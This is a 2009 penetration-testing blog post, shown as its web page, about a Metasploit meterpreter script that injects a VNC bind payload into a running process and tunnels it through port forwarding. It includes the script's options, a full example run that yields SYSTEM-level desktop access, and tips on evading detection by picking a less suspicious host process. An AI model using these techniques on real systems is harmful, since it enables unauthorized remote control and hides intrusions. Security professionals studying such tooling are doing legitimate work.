<!DOCTYPE html>
<html lang="en">
    <head>
        <meta charset="UTF-8">
<meta http-equiv="X-UA-Compatible" content="ie=edge">
<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
<meta name="author" content="mubix">
<meta name="description" content="So yesterday (December 14th, 2009) HD Moore posted a tweet with a pic of the new VNC meterpreter script that he wrote:
Looking at the script I noticed that it created a new connection (two connections outbound). Well it was the perfect excuse to take the newly refurbished portfwd command for a spin.
https://github.com/mubix/stuff/blob/master/metasploit/vnc_oneport.rb
Or you can get it via the SVN at Revision 7872
By creating a bind payload instead of a reverse connect we can have the payload listen locally." />
<meta name="keywords" content="" />
<meta name="robots" content="noodp" />
<meta name="theme-color" content="" />
<link rel="canonical" href="https://malicious.link/post/2009/2009-12-15-meterpreter-tunneling-and-vnc-revamped/" />


    <title>
        
            Meterpreter tunneling and VNC revamped :: malicious.link  â€” welcome
        
    </title>


<link href="https://cdnjs.cloudflare.com/ajax/libs/flag-icon-css/3.5.0/css/flag-icon.min.css" rel="stylesheet"
    type="text/css">



<link rel="stylesheet" href="/main.a6537515292628f292bc89dc1bb6a3480b72f307b458bdd65364ae5b8b20399d.css">






<meta itemprop="name" content="Meterpreter tunneling and VNC revamped">
<meta itemprop="description" content="So yesterday (December 14th, 2009) HD Moore posted a tweet with a pic of the new VNC meterpreter script that he wrote:
Looking at the script I noticed that it created a new connection (two connections outbound). Well it was the perfect excuse to take the newly refurbished portfwd command for a spin.
https://github.com/mubix/stuff/blob/master/metasploit/vnc_oneport.rb
Or you can get it via the SVN at Revision 7872
By creating a bind payload instead of a reverse connect we can have the payload listen locally."><meta itemprop="datePublished" content="2009-12-15T13:00:37&#43;00:00" />
<meta itemprop="dateModified" content="2009-12-15T13:00:37&#43;00:00" />
<meta itemprop="wordCount" content="794">
<meta itemprop="keywords" content="" />
<meta name="twitter:card" content="summary"/>
<meta name="twitter:title" content="Meterpreter tunneling and VNC revamped"/>
<meta name="twitter:description" content="So yesterday (December 14th, 2009) HD Moore posted a tweet with a pic of the new VNC meterpreter script that he wrote:
Looking at the script I noticed that it created a new connection (two connections outbound). Well it was the perfect excuse to take the newly refurbished portfwd command for a spin.
https://github.com/mubix/stuff/blob/master/metasploit/vnc_oneport.rb
Or you can get it via the SVN at Revision 7872
By creating a bind payload instead of a reverse connect we can have the payload listen locally."/>





    <meta property="article:section" content="metasploit" />

    <meta property="article:section" content="meterpreter" />

    <meta property="article:section" content="vnc" />



    <meta property="article:published_time" content="2009-12-15 13:00:37 &#43;0000 &#43;0000" />








    </head>

    <body class="dark-theme">
        <div class="container">
            <header class="header">
    <span class="header__inner">
        <a href="/post/" style="text-decoration: none;">
    <div class="logo">
        
            <span class="logo__mark">></span>
            <span class="logo__text">boot mubix.kernel</span>
            <span class="logo__cursor" style=
                  "
                   
                   ">
            </span>
        
    </div>
</a>


        <span class="header__right">
            
                <nav class="menu">
    <ul class="menu__inner"><li><a href="https://malicious.link/about">About</a></li><li><a href="https://malicious.link/brandon">Brandon</a></li><li><a href="https://malicious.link/post">Posts</a></li><li><a href="https://malicious.link/start">Start</a></li><li><a href="https://malicious.link/tags">Tags</a></li>
    </ul>
</nav>

                <span class="menu-trigger">
                    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24">
                        <path d="M0 0h24v24H0z" fill="none"/>
                        <path d="M3 18h18v-2H3v2zm0-5h18v-2H3v2zm0-7v2h18V6H3z"/>
                    </svg>
                </span>
            

            <span class="theme-toggle unselectable"><svg class="theme-toggler" width="24" height="24" viewBox="0 0 48 48" fill="none" xmlns="http://www.w3.org/2000/svg">
  <path d="M22 41C32.4934 41 41 32.4934 41 22C41 11.5066 32.4934 3 22
  3C11.5066 3 3 11.5066 3 22C3 32.4934 11.5066 41 22 41ZM7 22C7
  13.7157 13.7157 7 22 7V37C13.7157 37 7 30.2843 7 22Z"/>
</svg>
</span>
        </span>
    </span>
</header>


            <div class="content">
                
    <main class="post">

        <div class="post-info">
            
            </p>
        </div>

        <article>
            <h2 class="post-title"><a href="https://malicious.link/post/2009/2009-12-15-meterpreter-tunneling-and-vnc-revamped/">Meterpreter tunneling and VNC revamped</a></h2>
            <p>Published: 15 Dec 2009 - 13:00 &#43;0000</p>

            

            

            <div class="post-content">
                <p>So yesterday (December 14th, 2009) <a href="http://twitter.com/hdmoore">HD Moore</a> posted <a href="http://twitter.com/hdmoore/status/6663737357">a tweet</a> with a pic of the new VNC meterpreter script that he wrote:</p>
<p><img src="/images/postimages/200912_vnc_1.png" alt=""></p>
<p>Looking at the script I noticed that it created a new connection (two connections outbound). Well it was the perfect excuse to take the newly refurbished portfwd command for a spin.</p>
<p><a href="https://github.com/mubix/stuff/blob/master/metasploit/vnc_oneport.rb">https://github.com/mubix/stuff/blob/master/metasploit/vnc_oneport.rb</a></p>
<p>Or you can get it via the SVN at <a href="https://metasploit.com/redmine/projects/framework/repository/revisions/7872">Revision 7872</a></p>
<p>By creating a bind payload instead of a reverse connect we can have the payload listen locally. Then with portfwd command (just like on your home router) we forward a local port to the local host on the remote side, to the binded port. Connecting to the freshly bound port as if we were actually doing everything on the box itself. Creating a new session and a nice beautiful VNC window.</p>
<h2 id="options">Options:</h2>
<pre><code>meterpreter &gt; run vnc_oneport -h

OPTIONS:  
-e &lt;opt&gt; The process to run and inject into (default: notepad.exe)  
-h  This help menu  
-l &lt;opt&gt; The local port to listen on via port forwarding (default: 5901)  
-p &lt;opt&gt; The port on the remote host to bind VNC to (default: randomized)

meterpreter &gt;
</code></pre><h2 id="example-run">Example Run:</h2>
<pre><code>[*] Meterpreter session 1 opened (192.168.92.103:4444 -&gt; 192.168.92.113:1038)

meterpreter &gt; **_run vnc_oneport_**
[*] Creating a VNC stager: RHOST=127.0.0.1 LPORT=1207
[*] Host process notepad.exe has PID 532
[*] Allocated memory at address 0x00640000
[*] Writing the VNC stager into memory...
[*] Running Payload
[*] Creating a new thread within notepad.exe to run the VNC stager...
[*] Starting the port forwarding from 5901 =&gt; TARGET:1207
[*] Local TCP relay created: 0.0.0.0:5901 &lt;-&gt; 127.0.0.1:1207

meterpreter &gt; [*] VNC Server session 2 opened (127.0.0.1:56893 -&gt; 127.0.0.1:5901)
Connected to RFB server, using protocol version 3.3
No authentication needed
Desktop name &quot;VNCShell [SYSTEM@WORKSTATION1] - Full Access&quot;
VNC server default format:
32 bits per pixel.
Least significant byte first in each pixel.
	True colour: max red 255 green 255 blue 255, shift red 16 green 8 blue 0
	Using default colormap which is TrueColor.  Pixel format:
	32 bits per pixel.
Least significant byte first in each pixel.
	True colour: max red 255 green 255 blue 255, shift red 16 green 8 blue 0
	Using shared memory PutImage
Same machine: preferring raw encoding
ShmCleanup called
[*] VNC Server session 2 closed.
meterpreter &gt;
[*] Meterpreter session 1 opened (192.168.92.103:4444 -&gt; 192.168.92.113:1038)  
meterpreter &gt; run vnc_oneport  
[*] Creating a VNC stager: RHOST=127.0.0.1 LPORT=1207  
[*] Host process notepad.exe has PID 532  
[*] Allocated memory at address 0x00640000  
[*] Writing the VNC stager into memory...  
[*] Running Payload  
[*] Creating a new thread within notepad.exe to run the VNC stager...  
[*] Starting the port forwarding from 5901 =&gt; TARGET:1207  
[*] Local TCP relay created: 0.0.0.0:5901 &lt;-&gt; 127.0.0.1:1207  
meterpreter &gt; [*] VNC Server session 2 opened (127.0.0.1:56893 -&gt; 127.0.0.1:5901)  
Connected to RFB server, using protocol version 3.3  
No authentication needed  
Desktop name &quot;VNCShell [SYSTEM@WORKSTATION1] - Full Access&quot;VNC server default format: 32 bits per pixel. Least significant byte first in each pixel. True colour: max red 255 green 255 blue 255, shift red 16 green 8 blue 0  
Using default colormap which is TrueColor.  Pixel format: 32 bits per pixel. Least significant byte first in each pixel. True colour: max red 255 green 255 blue 255, shift red 16 green 8 blue 0  
Using shared memory PutImageSame machine: preferring raw encodingShmCleanup called  
[*] VNC Server session 2 closed.

meterpreter &gt;
</code></pre><h2 id="note">Note:</h2>
<p>The forwarded port does not close even if the meterpreter session is ended, so use the following command to close the forward:</p>
<pre><code>meterpreter &gt; portfwd delete -l 5901  
[*] Successfully stopped TCP relay on 0.0.0.0:5901
meterpreter &gt;

(Note to BT4 users: do a `apt-get install vncviewer` before using any of the vnc payloads in Metasploit)

The script utilizes just one of the millions of way you can leverage 'portfwd' in your endeavors. But where it gets interesting is the fact that the delivery method for the payload never touches disk. That magic is all credited to HD though. What happens is a new process is created (notepad by default) and the newly created VNC bind payload is injected into it. But, the beauty is that it's doing local connections via the port forwarding so all you see in TCPView is:

![](/images/postimages/200912_vnc_2.png)

Now it's definitely suspicious that Notepad has any connections at all, but you can use the option `-e` to provide any executable you wish, as long as it's in the path for the system. For examples, look at what's running naturally already.

Plus, you would probably not be using port 4444 for a meterpreter session. But what I wanted to demonstrate with this script is the power of both meterpreter, and port forwarding.

Now it's your turn to make it better. Take a look at the guts, see if anything will help you in your scripting.</code></pre>
            </div>
        </article>

        <hr />

        <div class="post-info">
            
            
    <p>
        <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-folder meta-icon"><path d="M22 19a2 2 0 0 1-2 2H4a2 2 0 0 1-2-2V5a2 2 0 0 1 2-2h5l2 3h9a2 2 0 0 1 2 2z"></path></svg>

        <span class="tag"><a href="https://malicious.link/categories/metasploit/">metasploit</a></span>
        <span class="tag"><a href="https://malicious.link/categories/meterpreter/">meterpreter</a></span>
        <span class="tag"><a href="https://malicious.link/categories/vnc/">vnc</a></span>
        
    </p>

  		</div>
    </main>

            </div>

            
                <footer class="footer">
    <div class="footer__inner">
        <div class="footer__content">
            <span>&copy; 2021</span>
            
            <span><a href="https://malicious.link/post/index.xml" target="_blank" title="rss"><svg xmlns="http://www.w3.org/2000/svg" width="18" height="18" viewBox="0 0 20 20" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-rss"><path d="M4 11a9 9 0 0 1 9 9"></path><path d="M4 4a16 16 0 0 1 16 16"></path><circle cx="5" cy="19" r="1"></circle></svg></a></span>
        </div>
    </div>
    <div class="footer__inner">
        <div class="footer__content">
            <span>Powered by <a href="http://gohugo.io">Hugo</a></span>
            <span>Made with &#10084; by <a href="https://github.com/rhazdon">Djordje Atlialp</a></span>
          </div>
    </div>
</footer>

            
        </div>

        




<script type="text/javascript" src="/bundle.min.a0f363fdf81cdc5cfacc447a79c33189eb000d090336cd04aac8ee256f423b3133b836c281944c19c75e38d0b0b449f01ce5807e37798b7ac94ac1db51983fc4.js" integrity="sha512-oPNj/fgc3Fz6zER6ecMxiesADQkDNs0EqsjuJW9COzEzuDbCgZRMGcdeONCwtEnwHOWAfjd5i3rJSsHbUZg/xA=="></script>



    </body>
</html>
